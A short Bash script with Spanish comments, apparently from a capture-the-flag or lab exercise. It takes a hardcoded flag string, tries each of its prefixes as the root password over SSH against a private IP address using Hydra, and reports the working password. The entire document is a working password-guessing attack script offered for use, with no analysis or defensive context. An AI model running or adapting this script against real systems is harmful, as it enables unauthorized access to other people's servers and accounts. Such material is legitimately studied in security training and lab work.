#!/bin/bash
# Guardar como: test_incremental.sh

FLAG="ok?vi{~xs$:(1@qrd&<_)4ne!aw-t1f"
IP="10.0.3.5"
USER="root"

echo "[*] Probando incrementalmente la flag como contraseña"

# Probar longitudes de 1 a N
for i in $(seq 1 ${#FLAG}); do
    PASS="${FLAG:0:$i}"
    echo "[*] Probando longitud $i: $PASS"
    
    # Probar con Hydra (un solo intento por longitud)
    timeout 5 hydra -l $USER -p "$PASS" ssh://$IP -t 1 -f -I 2>/dev/null | grep -q "login:"
    
    if [ $? -eq 0 ]; then
        echo "✅ ¡ENCONTRADO! Usuario: $USER, Contraseña: $PASS"
        exit 0
    fi
done

echo "❌ No se encontró ninguna coincidencia"
